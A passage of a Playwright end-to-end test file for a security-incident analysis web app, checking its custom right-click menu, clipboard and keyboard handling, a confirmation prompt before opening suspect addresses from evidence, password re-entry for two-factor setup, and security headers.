  await visitor.locator('#login-username').click({ button: 'right' })
  await menu.getByRole('menuitem', { name: /^Select all/ }).click()
  await expect(menu).toHaveCount(0)
  expect(
    await visitor
      .locator('#login-username')
      .evaluate((input) => input.value.slice(input.selectionStart, input.selectionEnd)),
  ).toBe('somebody')
  // On what is selected, Cut can be done.
  await visitor.locator('#login-username').click({ button: 'right', position: { x: 24, y: 10 } })
  await expect(menu.getByRole('menuitem', { name: /^Cut/ })).not.toHaveAttribute('aria-disabled', 'true')
  await visitor.keyboard.press('Escape')

  // A password is not copied.
  await visitor.fill('#login-password', 'not-a-password')
  await visitor.locator('#login-password').press('Control+a')
  await visitor.locator('#login-password').click({ button: 'right' })
  const copy = menu.getByRole('menuitem', { name: /^Copy\s*ctrl c$/ })
  await expect(copy).toHaveAttribute('aria-disabled', 'true')
  await expect(copy).toHaveAttribute('title', 'A password is not copied')
  await visitor.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)

  // Shift + right-click is a right-click: no key brings the browser's menu back.
  await visitor.locator('#login-username').click({ button: 'right', modifiers: ['Shift'] })
  await expect(menu.getByRole('menuitem', { name: /^Paste/ })).toBeVisible()
  await visitor.keyboard.press('Escape')

  await nativeMenuNeverOpens(visitor, 'the sign-in page')
  await visitor.close()
})

test("right-click opens Nik's menu on every screen: the incident and its tabs, the pages of the rail, Settings", async () => {
  test.setTimeout(240_000)
  const menu = page.getByRole('menu')
  const sections = page.getByRole('navigation', { name: 'Sections' })
  const main = page.locator('main')
  /** The edge of the main area, above what it shows. */
  const emptyArea = async (where) => {
    await main.click({ button: 'right', position: { x: 160, y: 4 } })
    const texts = await menu.getByRole('menuitem').allTextContents()
    expect(texts.slice(-GENERAL_MENU.length), where).toEqual(GENERAL_MENU)
    await page.keyboard.press('Escape')
    await expect(menu).toHaveCount(0)
  }

  // ---- The incident: every tab, and every kind of evidence ----
  const tabs = page.locator('nav[aria-label="Analysis tabs"]').getByRole('button')
  const tabCount = await tabs.count()
  expect(tabCount).toBeGreaterThan(5)
  for (let index = 0; index < tabCount; index += 1) {
    const name = (await tabs.nth(index).getAttribute('aria-label')) ?? (await tabs.nth(index).textContent())
    await tabs.nth(index).click()
    await emptyArea(`the tab ${name}`)
    await nativeMenuNeverOpens(page, `the tab ${name}`)
  }
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Evidence', exact: true }).click()
  const kinds = page.getByRole('navigation', { name: 'Evidence' }).getByRole('button')
  const kindCount = Math.min(await kinds.count(), 14)
  for (let index = 0; index < kindCount; index += 1) {
    await kinds.nth(index).click()
    await nativeMenuNeverOpens(page, `evidence ${index}`)
  }
  // The tab bar and the rail are not rows of anything: the general section alone.
  await opensNikMenu(sections.getByRole('button', { name: 'Platform settings' }), 'the rail')
  await openEvidence('Malware Analysis')
  // An object keeps its own menu, with Shift held down too.
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  await sample.click({ button: 'right', modifiers: ['Shift'] })
  await expect(menu).toContainText('dropper.bin')
  await expect(menu.getByRole('menuitem').last()).toHaveText('Copy the address of this page')
  await page.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)

  // ---- The list of incidents: a row, and what the page adds for itself ----
  await openIncidentList()
  const rowMenu = await opensNikMenu(incidentRow(), 'a row of the incident list', ['Open', 'Quick view'])
  expect(rowMenu.slice(-GENERAL_MENU.length - 2, -GENERAL_MENU.length)).toEqual(['New incident…', 'Columns…'])
  await nativeMenuNeverOpens(page, 'the incident list')
  await page.goBack()
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()

  // ---- The pages of the rail ----
  for (const [open, close] of [
    [/^My tasks/, 'Close my tasks'],
    ['Dashboards', 'Close dashboards'],
    ['Playground', 'Close the playground'],
  ]) {
    await sections.getByRole('button', { name: open }).click()
    await expect(sections.getByRole('button', { name: open })).toHaveAttribute('aria-pressed', 'true')
    await opensNikMenu(sections.getByRole('button', { name: open }), `the page ${close}`)
    await nativeMenuNeverOpens(page, `the page ${close}`)
    // The page's own button closes it: the entry of the rail only ever opens.
    await page.getByRole('button', { name: close }).click()
  }
  // The Indicators are a page with its panel: Back returns to the incident, with the panel still beside it.
  await sections.getByRole('button', { name: /^Indicators/ }).click()
  await expect(page.getByRole('button', { name: 'Hide the indicators panel' })).toBeVisible()
  await nativeMenuNeverOpens(page, 'the panel of the indicators')
  await page.goBack()
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
  // The artifacts are a page of their own, with their list at the side.
  await sections.getByRole('button', { name: 'Artifacts' }).click()
  await expect(page.getByRole('heading', { name: 'No artifact selected' })).toBeVisible()
  await nativeMenuNeverOpens(page, 'the panel of the artifacts')
  await leaveSidePanel()

  // ---- Automations: the lists, the canvas, the editor of a script ----
  await sections.getByRole('button', { name: /^Automations/ }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  const nav = area.getByRole('navigation', { name: 'Automations' })
  await expect(area.getByRole('table').first()).toBeVisible()
  // The page adds what it makes, under the row's own entries.
  const playbookMenu = await opensNikMenu(area.getByRole('table').first().getByRole('row').nth(1), 'a playbook', [
    'Open',
    'New playbook…',
  ])
  expect(playbookMenu.indexOf('New playbook…')).toBeGreaterThan(playbookMenu.indexOf('Open'))
  await nativeMenuNeverOpens(page, 'the playbooks')
  await area.getByRole('table').first().getByRole('row').nth(1).getByRole('button').first().click()
  const canvas = area.getByTestId('playbook-canvas')
  await expect(canvas.locator('.react-flow__node').first()).toBeVisible()
  await nativeMenuNeverOpens(page, 'the playbook editor')
  await canvas.locator('.react-flow__pane').click({ button: 'right', position: { x: 6, y: 6 } })
  await expect(menu.getByRole('menuitem', { name: 'Fit the view' })).toBeVisible()
  await expect(menu.getByRole('menuitem').last()).toHaveText('Copy the address of this page')
  await page.keyboard.press('Escape')
  await nav.getByRole('button', { name: 'Runs' }).click()
  await nativeMenuNeverOpens(page, 'the runs')
  await nav.getByRole('button', { name: 'Scripts' }).click()
  await expect(area.getByRole('table').first()).toBeVisible()
  await nativeMenuNeverOpens(page, 'the scripts')
  await area.getByRole('table').first().getByRole('row').nth(1).getByRole('button').first().click()
  // A code editor is a text field: its own undo, then cut, copy, paste, select all.
  const code = area.locator('.cm-content').first()
  await expect(code).toBeVisible()
  await code.click({ button: 'right' })
  await expect(menu.getByRole('menuitem')).toHaveText([
    'Undoctrl z',
    'Redoctrl shift z',
    'Cutctrl x',
    'Copyctrl c',
    'Pastectrl v',
    'Select allctrl a',
    ...GENERAL_MENU,
  ])
  await menu.getByRole('menuitem', { name: /^Select all/ }).click()
  // On what is selected (the first line of the script), Copy can be done.
  await code.click({ button: 'right', position: { x: 30, y: 14 } })
  await expect(menu.getByRole('menuitem', { name: /^Copy\s*ctrl c$/ })).not.toHaveAttribute('aria-disabled', 'true')
  await page.keyboard.press('Escape')
  await nativeMenuNeverOpens(page, 'the editor of a script')
  await page.getByRole('button', { name: 'Close automations' }).click()

  // ---- Settings: every section ----
  await sections.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const entries = settings.getByRole('navigation', { name: 'Settings sections' }).getByRole('button')
  const entryCount = await entries.count()
  expect(entryCount).toBeGreaterThan(15)
  for (let index = 0; index < entryCount; index += 1) {
    await entries.nth(index).click()
    await nativeMenuNeverOpens(page, `Settings, section ${index}`)
  }
  await expect(settings).toBeVisible()
  await settings.getByRole('button', { name: 'Close settings' }).click()
  await expect(settings).toHaveCount(0)
})

test('the menu in a dialog, on selected text, in the query box, on a link, and from the keyboard', async () => {
  const menu = page.getByRole('menu')
  await page.context().grantPermissions(['clipboard-read', 'clipboard-write'])
  const clipboard = () => page.evaluate(() => navigator.clipboard.readText())

  // ---- A dialog: the menu opens over it, and Escape closes the menu first ----
  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  const help = page.getByRole('dialog', { name: 'Keyboard shortcuts' })
  // The list says the rule, and no longer how to get the browser's menu.
  await expect(help).toContainText("Nik's menu, on every page")
  await expect(help).not.toContainText('Shift + right-click')
  const line = help.getByText('This list', { exact: true })
  await line.click({ button: 'right' })
  await expect(menu.getByRole('menuitem')).toHaveText(['Copy this text', ...GENERAL_MENU])
  await menu.getByRole('menuitem', { name: 'Copy this text' }).click()
  expect(await clipboard()).toBe('This list')
  await line.click({ button: 'right' })
  await expect(menu).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)
  await expect(help).toBeVisible()

  // ---- Selected text: the right-click keeps the selection, and Copy takes it ----
  await line.selectText()
  await line.click({ button: 'right', position: { x: 12, y: 8 } })
  await expect(menu.getByRole('menuitem').first()).toHaveText('Copyctrl c')
  expect(await page.evaluate(() => window.getSelection().toString())).toBe('This list')
  await page.evaluate(() => navigator.clipboard.writeText(''))
  await menu.getByRole('menuitem').first().click()
  expect(await clipboard()).toBe('This list')
  await nativeMenuNeverOpens(page, 'a dialog')
  await page.keyboard.press('Escape')
  await expect(help).toHaveCount(0)

  // ---- The query box: cut, copy, paste, select all, then its own helpers ----
  await openIncidentList()
  const panel = page.getByRole('region', { name: 'Incidents' })
  const filter = panel.getByRole('combobox', { name: 'Filter incidents' })
  await filter.fill('')
  await page.evaluate(() => navigator.clipboard.writeText('host:wks-*'))
  await filter.click({ button: 'right' })
  await expect(menu.getByRole('menuitem')).toHaveText([
    'Cutctrl x',
    'Copyctrl c',
    'Pastectrl v',
    'Select allctrl a',
    'Suggest what can be written herectrl space',
    'Build the query from rows',
    'New incident…',
    'Columns…',
    ...GENERAL_MENU,
  ])
  await menu.getByRole('menuitem', { name: /^Paste/ }).click()
  // The page hears the paste as typing: the list is filtered.
  await expect(filter).toHaveValue('host:wks-*')
  await expect(panel.getByRole('table', { name: 'Incidents' })).toContainText('WKS-FINANCE-01')
  await expect(filter).toBeFocused()
  await filter.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: /^Select all/ }).click()
  await page.evaluate(() => navigator.clipboard.writeText(''))
  await filter.click({ button: 'right', position: { x: 24, y: 10 } })
  await menu.getByRole('menuitem', { name: /^Cut/ }).click()
  await expect(filter).toHaveValue('')
  expect(await clipboard()).toBe('host:wks-*')
  await filter.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: /^Suggest/ }).click()
  await expect(panel.getByRole('listbox', { name: 'Suggestions' }).getByRole('option').first()).toBeVisible()
  await page.keyboard.press('Escape')

  // ---- The keyboard: the menu key and Shift + F10 on what has the focus ----
  await filter.focus()
  await page.keyboard.press('Shift+F10')
  await expect(menu.getByRole('menuitem', { name: /^Paste/ })).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)
  await expect(filter).toBeFocused()
  await incidentRow().focus()
  await page.keyboard.press('ContextMenu')
  await expect(menu.getByRole('menuitem', { name: 'Quick view' })).toBeVisible()
  // The arrows and Enter run an entry, as in every menu.
  await page.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)
  const settingsButton = page.getByRole('button', { name: 'Platform settings' })
  await settingsButton.focus()
  await page.keyboard.press('Shift+F10')
  await expect(menu.getByRole('menuitem')).toHaveText(GENERAL_MENU)
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('Enter')
  await expect(page.getByRole('dialog', { name: 'Keyboard shortcuts' })).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(page.getByRole('dialog', { name: 'Keyboard shortcuts' })).toHaveCount(0)

  // ---- The general section does what it says ----
  await settingsButton.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Copy the address of this page' }).click()
  expect(await clipboard()).toBe(page.url())
  await settingsButton.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: /^Search…/ }).click()
  const palette = page.getByRole('dialog', { name: 'Search' })
  await expect(palette).toBeVisible()
  await nativeMenuNeverOpens(page, 'the search')
  await page.keyboard.press('Escape')
  await expect(palette).toHaveCount(0)

  // ---- A link: open, open in a new tab, copy the address ----
  await page.goBack()
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Indicators', exact: true }).click()
  const link = page.locator('main a[title^="Download the indicators"]').first()
  await expect(link).toBeVisible()
  await link.click({ button: 'right' })
  await expect(menu.getByRole('menuitem', { name: 'Open in a new tab' })).toBeVisible()
  const linkMenu = await menu.getByRole('menuitem').allTextContents()
  expect(linkMenu.slice(0, 3)).toEqual(['Open', 'Open in a new tab', 'Copy the address'])
  expect(linkMenu.slice(-GENERAL_MENU.length)).toEqual(GENERAL_MENU)
  await menu.getByRole('menuitem', { name: 'Copy the address', exact: true }).click()
  expect(await clipboard()).toContain('/api/')
  await openEvidence('Malware Analysis')
})

test('an address from the evidence is opened only after asking', async () => {
  await openEvidence('Browser Forensics')
  await page
    .getByRole('navigation', { name: 'Browser analysis sections' })
    .getByRole('button', { name: /^Bookmarks/ })
    .click()
  const open = page.getByRole('button', { name: 'Open the address' }).first()
  await expect(open).toBeVisible()
  // No link to the suspect's address is left in the page for a stray click.
  await expect(page.locator('main a[target="_blank"]')).toHaveCount(0)

  const popups = []
  page.context().on('page', (popup) => popups.push(popup))
  await open.click()
  const ask = page.getByRole('dialog', { name: 'Open an address from the evidence?' })
  await expect(ask).toContainText('from your workstation')
  await expect(ask).toContainText(/hxxps?\[:\]\/\//)
  await ask.getByRole('button', { name: 'Copy defanged' }).click()
  await ask.getByRole('button', { name: 'Cancel' }).click()
  await expect(ask).toHaveCount(0)
  expect(popups).toEqual([])
})

test('setting a second factor up asks for the password first, when the sign-in is not of a moment ago', async () => {
  // The admin signed in many tests ago: an open session is not proof of who is at the keyboard.
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('My account').click()
  await settings.getByRole('button', { name: 'Set up a second factor…' }).click()
  const setup = page.getByRole('dialog', { name: 'Set up a second factor' })
  const password = setup.locator('#second-factor-password')
  await expect(password).toBeVisible()
  await expect(setup.getByLabel('Secret', { exact: true })).toHaveCount(0)
  await expect(setup.getByRole('button', { name: 'Continue' })).toBeDisabled()
  // A wrong password shows no secret; the right one does.
  await password.fill('not-the-password')
  await setup.getByRole('button', { name: 'Continue' }).click()
  await expect(setup.getByRole('alert')).toContainText('password is not correct')
  await expect(setup.getByLabel('Secret', { exact: true })).toHaveCount(0)
  await password.fill(ADMIN.password)
  await setup.getByRole('button', { name: 'Continue' }).click()
  await expect(setup.getByLabel('Secret', { exact: true })).toBeVisible()
  // Left there: without a first code nothing is on.
  await setup.getByRole('button', { name: 'Cancel' }).click()
  await expect(setup).toHaveCount(0)
  expect((await (await page.request.get('/api/auth/me')).json()).user.secondFactor).toBe(false)
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('the app runs under its security headers, and the policy blocked nothing', async ({ request }) => {
  const headers = (await request.get('/')).headers()
  expect(headers['content-security-policy']).toContain("script-src 'self' 'wasm-unsafe-eval'")
  expect(headers['content-security-policy']).toContain("frame-ancestors 'none'")
  expect(headers['x-content-type-options']).toBe('nosniff')
  expect(headers['x-frame-options']).toBe('DENY')
  expect(blocked).toEqual([])
})

test('the API is reachable through the same origin', async ({ request }) => {
  const health = await request.get('/api/health')
  expect(health.ok()).toBeTruthy()
  const ready = await request.get('/api/ready')
  expect(ready.ok()).toBeTruthy()
})
